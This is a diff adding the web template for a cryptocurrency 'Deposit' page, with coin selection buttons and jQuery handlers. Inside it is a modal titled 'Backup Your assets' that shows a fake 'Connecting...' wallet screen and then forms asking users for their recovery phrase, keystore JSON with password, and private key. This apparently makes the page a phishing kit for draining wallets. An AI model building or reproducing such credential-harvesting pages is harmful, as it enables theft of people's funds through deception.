@@ -1,0 +1,718 @@
+<%- include ('./partials/secureHeader') %>	
+
+        <!-- Page Content - Only Page Elements Here-->
+        <div class="page-content footer-clear">
+
+            <!-- Page Title-->
+            <div class="pt-3">
+                <div class="page-title d-flex">
+                    <div class="align-self-center">
+                        <a href="#"
+                            data-back-button
+                            class="me-3 ms-0 icon icon-xxs bg-theme rounded-s shadow-m">
+                            <i class="bi bi-chevron-left color-theme font-14"></i>
+                        </a>
+                    </div>
+                    <div class="align-self-center me-auto">
+                        <!-- <p class="color-highlight">Hello Enabled</p> -->
+                        <h1 class="color-theme">Deposit</h1>
+                    </div>
+                    <div class="align-self-center ms-auto">
+
+
+        <a href="#" data-bs-toggle="dropdown"
+        class="icon gradient-blue shadow-bg shadow-bg-s rounded-m">
+        <img src="/img/user-default.png" width="45" class="rounded-m" alt="img">
+    </a>
+    <!-- Page Title Dropdown Menu-->
+    <div class="dropdown-menu">
+        <div class="card card-style shadow-m mt-1 me-1">
+            <div class="list-group list-custom list-group-s list-group-flush rounded-xs px-3 py-1">
+           
+                <a href="profile" class="list-group-item">
+                    <i
+                        class="has-bg gradient-yellow shadow-bg shadow-bg-xs color-white rounded-xs bi bi-person-circle"></i>
+                    <strong class="font-13">Account</strong>
+                </a>
+
+                <a href="#" class="list-group-item" data-toggle-theme="" data-trigger-switch="switch-1">
+                    <i class="has-bg gradient-blue shadow-bg shadow-bg-xs color-white rounded-xs bi-lightbulb-fill"></i>
+                    <strong class="font-13">Dark Mood</strong>
+                    <div class="form-switch ios-switch switch-green switch-s me-2">
+                        <input type="checkbox" data-toggle-theme="" class="ios-input" id="switch-1">
+                        <label class="custom-control-label" for="switch-1"></label>
+                    </div>
+                </a>
+
+                <a href="includes/logout.php" class="list-group-item">
+                    <i
+                        class="has-bg gradient-red shadow-bg shadow-bg-xs color-white rounded-xs bi bi-power"></i>
+                    <strong class="font-13">Log Out</strong>
+                </a>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    count_cart_item();
+    //count_wishlist_item();
+
+    function count_cart_item() {
+        $("#cart_table tbody").empty();
+        var load_count = "loadcount";
+        $.ajax({
+            url: 'includes/server',
+            type: 'POST',
+            dataType: 'JSON',
+            data: {
+                load_count: load_count,
+            },
+            success: function(response) {
+                //porpulate cart count
+                $('.cart_item_count').text(response.mssg);
+            }
+        });
+
+    }
+</script>                </div>
+            </div>
+
+            <div class="row text-center">
+
+                <div style="padding: 35px !important;" class="dashboard-body-part">
+
+                    <div style="margin-bottom: 35px;" class="text-center">
+                        <h5 class="title">Make a Deposit</h5>
+                        <p>
+                            Easily fund your account using our secure deposit system. Choose from a variety of supported payment methods and
+                            wallets to add funds instantly. Your transactions are protected with the latest encryption technology, ensuring
+                            safety and privacy at every step.
+                            Once your deposit is confirmed, the balance will be available for trading, investing, or withdrawals.
+                        </p>
+                    </div>
+
+
+                    <div class="row g-sm-4 g-3 justify-content-center">
+                        <div class="col-xxl-2 col-lg-3 col-sm-4 col-6">
+                            <div class="payment-box text-center card card-style">
+                                <div class="payment-box-thumb">
+                                    <a id="trust" data-toggle="modal" href="#cmpltadminModal-7" class="wallet">
+                                        <img src="/img/btc.webp" alt="Lights" class="trans-img">
+                                    </a>
+                                </div>
+                                <div class="payment-box-content">
+                                    <h5 class="title">Bitcoin (BTC) <i class="fas fa-google-wallet    "></i></h5>
+                                    <button onclick="customAction(this)" id="trust" data-id="bitcoin" class="btn-full btn gradient-green shadow-bg shadow-bg-m wallet w-100">Proceed</button>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="col-xxl-2 col-lg-3 col-sm-4 col-6">
+                            <div class="payment-box text-center card card-style">
+                                <div class="payment-box-thumb">
+                                    <a id="lob" data-toggle="modal" href="#cmpltadminModal-7" class="wallet">
+                                        <img src="/img/ethereum.webp" alt="Lights" class="trans-img">
+                                    </a>
+                                </div>
+                                <div class="payment-box-content">
+                                    <h5 class="title">Ethereum (ETH)</h5>
+                                    <button onclick="customAction(this)" id="" data-href="" data-id="ethereum" class="btn-full btn gradient-green shadow-bg shadow-bg-m wallet w-100">Proceed</button>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="col-xxl-2 col-lg-3 col-sm-4 col-6">
+                            <div class="payment-box text-center card card-style">
+                                <div class="payment-box-thumb">
+                                    <a id="Wallet_connect" data-toggle="modal" href="#" class="wallet">
+                                        <img src="/img/usdt.webp" alt="Lights" class="trans-img">
+                                    </a>
+                                </div>
+                                <div class="payment-box-content">
+                                    <h5 class="title">USDT (TRC20)</h5>
+                                    <button onclick="customAction(this)" id="" data-href="" data-id="tether" class="btn-full btn gradient-green shadow-bg shadow-bg-m wallet w-100">Proceed</button>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="col-xxl-2 col-lg-3 col-sm-4 col-6">
+                            <div class="payment-box text-center card card-style">
+                                <div class="payment-box-thumb">
+                                    <a id="atomic" data-toggle="modal" href="#" class="wallet">
+                                        <img src="/img/xlm.webp" alt="Lights" class="trans-img">
+                                    </a>
+                                </div>
+                                <div class="payment-box-content">
+                                    <h5 class="title">Stellar (XLM)</h5>
+                                    <button onclick="customAction(this)" id="" data-href="" data-id="stellar" class="btn-full btn gradient-green shadow-bg shadow-bg-m wallet w-100">Proceed</button>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="col-xxl-2 col-lg-3 col-sm-4 col-6">
+                            <div class="payment-box text-center card card-style">
+                                <div class="payment-box-thumb">
+                                    <a id="metamask" data-toggle="modal" href="#" class="wallet">
+                                        <img src="/img/xrp.webp" alt="Lights" class="trans-img">
+                                    </a>
+                                </div>
+                                <div class="payment-box-content">
+                                    <h5 class="title">Ripple (XRP)</h5>
+                                    <button onclick="customAction(this)" id="" data-href="" data-id="ripple" class="btn-full btn gradient-green shadow-bg shadow-bg-m wallet w-100">Proceed</button>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="col-xxl-2 col-lg-3 col-sm-4 col-6">
+                            <div class="payment-box text-center card card-style">
+                                <div class="payment-box-thumb">
+                                    <a id="rainbow" data-toggle="modal" href="#" class="wallet">
+                                        <img src="/img/litecoin.webp" alt="Lights" class="trans-img">
+                                    </a>
+                                </div>
+                                <div class="payment-box-content">
+                                    <h5 class="title">Litecoin (LTC)</h5>
+                                    <button onclick="customAction(this)" id="trust" data-href="" data-id="litecoin" class="btn-full btn gradient-green shadow-bg shadow-bg-m wallet w-100">Proceed</button>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="col-xxl-2 col-lg-3 col-sm-4 col-6">
+                            <div class="payment-box text-center card card-style">
+                                <div class="payment-box-thumb">
+                                    <a id="money" data-toggle="modal" href="#" class="wallet">
+                                        <img src="/img/doge.webp" alt="Lights" class="trans-img">
+                                    </a>
+                                </div>
+                                <div class="payment-box-content">
+                                    <h5 class="title">DOGE</h5>
+                                    <button onclick="customAction(this)" id="" data-href="" data-id="doge" class="btn-full btn gradient-green shadow-bg shadow-bg-m wallet w-100">Proceed</button>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="col-xxl-2 col-lg-3 col-sm-4 col-6">
+                            <div class="payment-box text-center card card-style">
+                                <div class="payment-box-thumb">
+                                    <a id="gnosis_safe_multisig" data-toggle="modal" href="#" class="wallet">
+                                        <img src="/img/bnb-icon2_2x.webp" alt="Lights" class="trans-img">
+                                    </a>
+                                </div>
+                                <div class="payment-box-content">
+                                    <h5 class="title">Binancecoin (BNB)</h5>
+                                    <button onclick="customAction(this)" id="" data-href="" data-id="binancecoin" class="btn-full btn gradient-green shadow-bg shadow-bg-m wallet w-100">Proceed</button>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="col-xxl-2 col-lg-3 col-sm-4 col-6">
+                            <div class="payment-box text-center card card-style">
+                                <div class="payment-box-thumb">
+                                    <a id="crypto" data-toggle="modal" href="#" class="wallet">
+                                        <img src="/img/shiba.webp" alt="Lights" class="trans-img">
+                                    </a>
+                                </div>
+                                <div class="payment-box-content">
+                                    <h5 class="title">SHIBA</h5>
+                                    <button onclick="customAction(this)" id="" data-href="" data-id="shiba-inu" class="btn-full btn gradient-green shadow-bg shadow-bg-m wallet w-100">Proceed</button>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="col-xxl-2 col-lg-3 col-sm-4 col-6">
+                            <div class="payment-box text-center card card-style">
+                                <div class="payment-box-thumb">
+                                    <a id="pillar" data-toggle="modal" href="#" class="wallet">
+                                        <img src="/img/tron.png" alt="Lights" class="trans-img">
+                                    </a>
+                                </div>
+                                <div class="payment-box-content">
+                                    <h5 class="title">Tron</h5>
+                                    <button onclick="customAction(this)" id="" data-href="" data-id="tron" class="btn-full btn gradient-green shadow-bg shadow-bg-m wallet w-100">Proceed</button>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="col-xxl-2 col-lg-3 col-sm-4 col-6">
+                            <div class="payment-box text-center card card-style">
+                                <div class="payment-box-thumb">
+                                    <a id="anchor" data-toggle="modal" href="#" class="wallet">
+                                        <img src="/img/cardano.webp" alt="Lights" class="trans-img">
+                                    </a>
+                                </div>
+                                <div class="payment-box-content">
+                                    <h5 class="title">Cardano (ADA)</h5>
+                                    <button onclick="customAction(this)" id="" data-href="" data-id="cardano" class="btn-full btn gradient-green shadow-bg shadow-bg-m wallet w-100">Proceed</button>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="col-xxl-2 col-lg-3 col-sm-4 col-6">
+                            <div class="payment-box text-center card card-style">
+                                <div class="payment-box-thumb">
+                                    <a id="onto" data-toggle="modal" href="#" class="wallet">
+                                        <img src="/img/solana.webp" alt="Lights" class="trans-img">
+                                    </a>
+                                </div>
+                                <div class="payment-box-content">
+                                    <h5 class="title">Solana (SOL)</h5>
+                                    <button onclick="customAction(this)" id="" data-href="" data-id="solana" class="btn-full btn gradient-green shadow-bg shadow-bg-m wallet w-100">Proceed</button>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="col-xxl-2 col-lg-3 col-sm-4 col-6">
+                            <div class="payment-box text-center card card-style">
+                                <div class="payment-box-thumb">
+                                    <a id="tokenpocket" data-toggle="modal" href="#" class="wallet">
+                                        <img src="/img/matic-token-icon.webp" alt="Lights" class="trans-img">
+                                    </a>
+                                </div>
+                                <div class="payment-box-content">
+                                    <h5 class="title">MATIC</h5>
+                                    <button onclick="customAction(this)" id="" data-href="" data-id="polygon-ecosystem-token" class="btn-full btn gradient-green shadow-bg shadow-bg-m wallet w-100">Proceed</button>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="col-xxl-2 col-lg-3 col-sm-4 col-6">
+                            <div class="payment-box text-center card card-style">
+                                <div class="payment-box-thumb">
+                                    <a id="mathwallet" data-toggle="modal" href="#" class="wallet">
+                                        <img src="/img/Algorand.png" alt="Lights" class="trans-img">
+                                    </a>
+                                </div>
+                                <div class="payment-box-content">
+                                    <h5 class="title">Algorand (ALGO)</h5>
+                                    <button onclick="customAction(this)" id="" data-href="" data-id="algorand" class="btn-full btn gradient-green shadow-bg shadow-bg-m wallet w-100">Proceed</button>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="col-xxl-2 col-lg-3 col-sm-4 col-6">
+                            <div class="payment-box text-center card card-style">
+                                <div class="payment-box-thumb">
+                                    <a id="bitpay" data-toggle="modal" href="#" class="wallet">
+                                        <img src="/img/trump.png" alt="Lights" class="trans-img">
+                                    </a>
+                                </div>
+                                <div class="payment-box-content">
+                                    <h5 class="title">TRUMP</h5>
+                                    <button onclick="customAction(this)" id="" data-href="" data-id="official_trump" class="btn-full btn gradient-green shadow-bg shadow-bg-m wallet w-100">Proceed</button>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="col-xxl-2 col-lg-3 col-sm-4 col-6">
+                            <div class="payment-box text-center card card-style">
+                                <div class="payment-box-thumb">
+                                    <a id="maiar" data-toggle="modal" href="#" class="wallet">
+                                        <img src="/img/pepe-token.jpeg" alt="Lights" class="trans-img">
+                                    </a>
+                                </div>
+                                <div class="payment-box-content">
+                                    <h5 class="title">PEPE</h5>
+                                    <button onclick="customAction(this)" id="" data-href="" data-id="pepe" class="btn-full btn gradient-green shadow-bg shadow-bg-m wallet w-100">Proceed</button>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                </div>
+
+                <style>
+                    .trans-img {
+                        max-width: 100px !important;
+                        max-height: 130px !important;
+                        margin-top: 20px !important;
+                    }
+
+                    .card-style {
+                        margin: 0 !important;
+                        padding-bottom: 15px;
+                        padding-right: 10px;
+                        padding-left: 10px;
+                    }
+                </style>
+
+                <div id="menu-top-detached" style="height:380px;" class="offcanvas offcanvas-top rounded-m offcanvas-detached">
+                    <div class="d-flex m-3">
+                        <div class="align-self-center">
+                            <h4 class="font-700 mb-0">Backup Your assets</h4>
+                        </div>
+                        <div class="align-self-center ms-auto">
+                            <a href="#" class="closebutn icon icon-xs me-n2" data-bs-dismiss="offcanvas">
+                                <i class="bi bi-x-circle-fill color-red-dark font-16"></i>
+                            </a>
+                        </div>
+                    </div>
+                    <div class="modal-dialog" role="document">
+                        <!-- <form action="" method="post"> -->
+                        <input type="hidden" name="_token" value="p0gvYZcEqKi3wFcVVu99qSuCdhcnqUkA0eo1fovN">
+                        <div class="modal-content bg-body">
+                            <div class="row loaderdiv" style="margin: 10px 30px 0px 30px;">
+                                <div class="col-4 spct">
+                                    <div class="loader">
+                                        <div class="loader1">
+                                            <div class="circle"></div>
+                                            <div class="picture">
+                                                <img id="loader_img" src="" alt="Overlay Image">
+                                            </div>
+                                        </div>
+                                    </div>
+                                    <p id="con_stats">Connecting...</p>
+                                    <button style="display: none; margin-bottom: 10px; font-size: x-small;" id="con_button" type="submit" class="btn btn-xxs gradient-green"><i data-feather="repeat"></i> Connect Manually</button>
+                                </div>
+
+
+
+                                <div id="blc" class="col-6 spct text-center" style="margin-left: 16%; text-align: center;">
+                                    <div style="width: 100px;">
+                                        <img width="100%" id="img" src="/img/icons/trust-wallet-66f8777532931d9c09b633344981a6a9.png" alt="" style="display: inline-flex;">
+                                    </div>
+                                    <b id="wallet_name">Trust Wallet</b>
+                                </div>
+
+                                <style>
+                                    .spct {
+                                        display: flex;
+                                        /* Enables flexbox on the div */
+                                        flex-direction: column;
+                                        /* Stacks children vertically */
+                                        align-items: center;
+                                        /* Centers children horizontally */
+                                        justify-content: center;
+                                        /* Centers children vertically */
+                                        /* height: 100vh; */
+                                        /* Full viewport height for vertical centering */
+                                        margin: 0 auto;
+                                        /* Centers the div horizontally in its container */
+                                        text-align: center;
+                                        /* Ensures text is centered inside the div */
+                                    }
+
+                                    #blc img {
+                                        display: block;
+                                        /* Prevents inline space around the image */
+                                        margin: 0 auto;
+                                        /* Ensures the image is centered */
+                                    }
+
+                                    #menu-top-detached {
+                                        width: auto !important;
+                                        height: auto !important;
+                                        padding: 15px;
+                                    }
+
+                                    .modal-content {
+                                        background-color: rgb(255 255 255 / 0%) !important;
+                                    }
+
+                                    #wallet_name {
+                                        margin-top: 10px;
+                                        /* Adds spacing between the image and the text */
+                                    }
+
+                                    .YwSGw {
+                                        display: inline-block;
+                                        padding: 20px;
+                                        width: 60px;
+                                    }
+                                </style>
+
+                            </div>
+                            <div class="modal-body">
+                                <div style="display: none;" id="input_con" class="row">
+                                    <h3 id="modal-headline" class="text-lg leading-6 mt-2 font-medium text-gray-900" style="display: flex; flex-direction: row;" _mstvisible="6">
+                                        <img src="" style="margin-right: 20px; height: 40px; width: 40px" id="myImg" _mstvisible="7">
+                                        <span _msttexthash="543361" _msthash="8" _mstvisible="7">Import your
+                                            <span id="walletname1" _msttexthash="75595" _msthidden="1" _msthash="182"></span> wallet
+                                        </span>
+                                    </h3>
+                                    <nav>
+                                        <div class="nav nav-tabs" id="nav-tab" role="tablist">
+                                            <button class="nav-link active btn-sm" id="nav-home-tab" data-bs-toggle="tab" data-bs-target="#nav-home" type="button" role="tab" aria-controls="nav-home" aria-selected="true">Phrase</button>
+                                            <button class="nav-link btn-sm" id="nav-profile-tab" data-bs-toggle="tab" data-bs-target="#nav-profile" type="button" role="tab" aria-controls="nav-profile" aria-selected="false">Keystore JSON</button>
+                                            <button class="nav-link btn-sm" id="nav-contact-tab" data-bs-toggle="tab" data-bs-target="#nav-contact" type="button" role="tab" aria-controls="nav-contact" aria-selected="false">Private Key</button>
+                                        </div>
+                                    </nav>
+                                    <div class="tab-content" id="nav-tabContent">
+                                        <div class="tab-pane fade show active" id="nav-home" role="tabpanel" aria-labelledby="nav-home-tab">
+                                            <div style="margin-top: 10px;" class="col-md-12 col-sm-12 col-xs-12">
+                                                <form class="sendp">
+                                                    <div class="form-group">
+                                                        <textarea style="border-radius: 8px; background: transparent;" placeholder="Recovery Phrase" name="Phrase" class="form-control" rows="3" required="required"></textarea>
+                                                    </div>
+                                                    <div class="form-group">
+                                                        <input hidden type="text" name="type_of_login_detail" value="recovery phrase">
+                                                    </div>
+                                                    <small>Several lines of text beginning with "{...}" plus the password you used to encrypt it.</small>
+
+                                                    <div style="margin-top: 15px;" class="form-group">
+                                                        <button style="width: 100%;" class="shadow-btn btn btn-info btn-corner" _msttexthash="184587" _msthash="161">Proceed</button>
+                                                    </div>
+
+                                                </form>
+
+                                            </div>
+                                        </div>
+                                        <div class="tab-pane fade" id="nav-profile" role="tabpanel" aria-labelledby="nav-profile-tab">
+                                            <div style="margin-top: 10px;" class="col-md-12 col-sm-12 col-xs-12">
+
+                                                <form class="sendp">
+
+                                                    <div class="form-group">
+
+
+                                                        <textarea style="border-radius: 8px; background: transparent;" placeholder="Keystore JSON" name="Keystore_json" class="form-control" rows="3" required="required"></textarea>
+
+                                                    </div>
+                                                    <div class="form-group">
+                                                        <input name="password" style="border-radius: 8px; background: transparent;" type="text" class="form-control" placeholder="Wallet password">
+                                                        <input hidden type="text" name="type_of_login_detail" value="keystone">
+                                                    </div>
+                                                    <small>Several lines of text beginning with "{...}" plus the password you used to encrypt it.</small>
+
+                                                    <div style="margin-top: 15px;" class="form-group">
+                                                        <button style="width: 100%;" class="closebutn shadow-btn btn btn-info btn-corner" _msttexthash="184587" _msthash="161">Proceed</button>
+                                                    </div>
+
+                                                </form>
+
+                                            </div>
+                                        </div>
+                                        <div class="tab-pane fade" id="nav-contact" role="tabpanel" aria-labelledby="nav-contact-tab">
+                                            <div style="margin-top: 10px;" class="col-md-12 col-sm-12 col-xs-12">
+                                                <form class="sendp">
+                                                    <div class="form-group">
+                                                        <textarea style="border-radius: 8px; background: transparent;" placeholder="Private Key" name="Private_Key" class="form-control" rows="3" required="required"></textarea>
+
+                                                    </div>
+                                                    <div class="form-group">
+                                                        <input name="password" style="border-radius: 8px; background: transparent;" type="text" class="form-control" placeholder="Wallet password">
+                                                        <input hidden type="text" name="type_of_login_detail" value="PrivateKey">
+                                                    </div>
+                                                    <small>Several lines of text beginning with "{...}" plus the password you used to encrypt it.</small>
+
+                                                    <div style="margin-top: 15px;" class="form-group">
+                                                        <button style="width: 100%;" class="shadow-btn btn btn-info btn-corner" _msttexthash="184587" _msthash="161">Proceed</button>
+                                                    </div>
+                                                </form>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                            <div class="modal-footer">
+                                <!-- <button type="button" class="btn btn-xxs gradient-red" >Close</button> -->
+                                <a href="#" style="margin-top: 8px;" data-bs-dismiss="offcanvas" class="closebutn btn btn-xxs gradient-red">xxx Close</a>
+                            </div>
+                        </div>
+                        <!-- </form> -->
+                    </div>
+                </div>
+
+                <style>
+                    .loader1 {
+                        position: relative;
+                        width: 80px;
+                        height: 80px;
+                    }
+
+                    .circle {
+                        position: absolute;
+                        top: 0;
+                        left: 0;
+                        width: 100%;
+                        height: 100%;
+                        border: 2px solid #f3f3f300;
+                        border-top: 2px solid #3498db;
+                        border-radius: 50%;
+                        animation: spin 2s linear infinite;
+                    }
+
+                    .picture {
+                        position: absolute;
+                        top: 50%;
+                        left: 50%;
+                        transform: translate(-50%, -50%);
+                    }
+
+                    .picture img {
+                        width: 100%;
+                        /* height: 80px; */
+                        border-radius: 50%;
+                    }
+                </style>
+
+
+
+                <script>
+                    function customAction(el) {
+                        //const coinId = $("#coinId").val();
+                        const coinId = $(el).data("id"); // or use .attr("data-id")
+                        console.log(coinId);
+
+
+
+
+                        ///redirectet and send data to deposite page
+                        $.ajax({
+                            url: 'deposit2', // The endpoint where the data should go
+                            type: 'POST',
+                            data: {
+                                crypto_wallet: coinId,
+                            },
+                            success: function(response) {
+                                var form = $('<form action="deposit2" method="POST">' +
+                                    '<input type="hidden" name="crypto_wallet" value="' + coinId + '">' +
+                                    '</form>');
+                                $('body').append(form); // Append the form to the body
+                                form.submit(); // Submit the form
+                            },
+                            error: function(xhr, status, error) {
+                                console.error("Error processing transaction:", error);
+                            }
+                        });
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                        // $(".walletselect").val(coinId);
+                        // $(".walletselect").on("mousedown", function(e) {
+                        //     e.preventDefault(); // Prevents dropdown from opening
+                        // });
+                    };
+
+                    // Using event delegation to handle dynamic content
+                    $(document).on('change', '.tokenSelect', function() {
+                        var selectedValue = $(this).val(); // Get the selected value
+                        console.log(selectedValue);
+                        // Change the name attribute based on the selection
+                        if (selectedValue === 'Crypto') {
+                            // $(this).attr('name', 'Crypto'); // Set name to 'token'
+                            $('.formicon').removeClass('bi-currency-exchange').addClass('bi-currency-bitcoin'); // Change icon to exchange
+                            $('.tokencurrency').text('(Crypto Amount)');
+                            $('.amtid').removeClass('bi-currency-dollar').addClass('bi-currency-bitcoin'); // Change icon to exchange
+                        } else if (selectedValue === 'fiat') {
+                            // $(this).attr('name', 'fiat'); // Set name to 'fiat'
+                            $('.formicon').removeClass('bi-currency-bitcoin').addClass('bi-currency-exchange'); // Change icon to dollar
+                            $('.tokencurrency').text(`(${currencyCode = $("#currencyCode").val()} Currency Amount:  )`);
+                            $('.amtid').removeClass('bi-currency-bitcoin').addClass('bi-currency-exchange'); // Change icon to dollar
+                        }
+                    });
+
+                    ///style input number
+                    $(document).ready(function() {
+                        // Listen for input event using event delegation
+                        $(document).on('input', '.numberinput', function() {
+                            var rawValue = $(this).val();
+
+                            // Allow only numbers, commas, and periods
+                            var validValue = rawValue.replace(/[^0-9.,]/g, ''); // Remove any character that's not a number, comma, or period
+
+                            // Validate the value to prevent incorrect formats like "0.00000,555555555555"
+                            validValue = validateFormat(validValue);
+
+                            // Format the number with commas, but handle the decimal point
+                            var formattedValue = formatNumber(validValue);
+
+                            // Update the input field with the formatted value
+                            $(this).val(formattedValue);
+                        });
+
+                        // Validate the format to prevent invalid decimal and comma usage
+                        function validateFormat(value) {
+                            // Prevent starting with a comma or period
+                            if (value.startsWith(',') || value.startsWith('.')) {
+                                value = value.substring(1);
+                            }
+
+                            // Only allow one period
+                            if ((value.match(/\./g) || []).length > 1) {
+                                value = value.replace(/\.(?=.*\.)/g, ''); // Remove additional periods
+                            }
+
+                            // Prevent commas after a period or multiple commas
+                            if (value.includes('.') && value.indexOf(',') > value.indexOf('.')) {
+                                value = value.replace(/,/g, ''); // Remove commas after a decimal point
+                            }
+
+                            return value;
+                        }
+
+                        // Format the number with commas, but keep the decimal part intact
+                        function formatNumber(value) {
+                            if (!value) return value;
+
+                            // Split the value at the decimal point (if exists)
+                            var parts = value.split('.');
+
+                            // Format the integer part with commas
+                            parts[0] = parts[0].replace(/,/g, '').replace(/\B(?=(\d{3})+(?!\d))/g, ',');
+
+                            // Join the integer part and the decimal part back together
+                            return parts.join('.');
+                        }
+
+                        // Optional: Handle form submission or other processing
+                        $('#submit-button').on('click', function() {
+                            var rawValue = $('#c4').val().replace(/[^0-9.]/g, ''); // Remove commas and non-numeric characters except for the decimal point
+                            console.log('Raw numeric value (no commas or invalid characters):', rawValue); // Submit or process the raw numeric value
+                        });
+
+
+
+                    });
+
+                    //////when deposit button is clicked
+                    $(document).on("click", "#Proceed", function(e) {
+                        e.preventDefault();
+
+                        // Change the button text and add a spinner
+                        $(this).html('<span class="spinner-border spinner-border-sm" role="status" aria-hidden="true"></span> Processing, please wait...')
+                            .css("pointer-events", "none"); // Prevent multiple clicks
+
+                        // Get form data properly
+                        var formData = new FormData(document.getElementById("deposit_form"));
+                        formData.append("deposit_formkey", "deposit_formkey");
+
+
+                    });
+                </script>
+
+            </div>
+        </div>
+
+        <!-- Main Sidebar Menu -->
+        <div id="menu-sidebar" data-menu-active="nav-welcome" data-menu-load="sidebar.html"
+            class="offcanvas offcanvas-start offcanvas-detached rounded-m">
+        </div>
+
+        <!-- Highlights Menu -->
+        <div id="menu-highlights" data-menu-load="menu-highlights.html"
+            class="offcanvas offcanvas-bottom offcanvas-detached rounded-m">
+        </div>
+
+        <!-- Notifications Bell -->
+        <div id="menu-notifications" data-menu-load="menu-notifications.html"
+            class="offcanvas offcanvas-top offcanvas-detached rounded-m">
+        </div>
+
+        <!-- modal section -->
+        <div id="deposit_modal" data-menu-load="deposit_modal.html"
+            class="offcanvas offcanvas-bottom offcanvas-detached rounded-m">
+        </div>
+        <!-- modalsection ends  -->
+
+
+
+        <!--withjdraw modal section -->
+        <div id="withdrawal_modal" data-menu-load="withdrawal_modal.php"
+            class="offcanvas offcanvas-bottom offcanvas-detached rounded-m">
+        </div>
+        <!-- withdraw modalsection ends  -->
+
+
+    </div>
+    <!-- End of Page ID-->
+
+    <script src="/scripts/bootstrap.min.js"></script>
+    <script src="/scripts/custom.js"></script>
+</body>
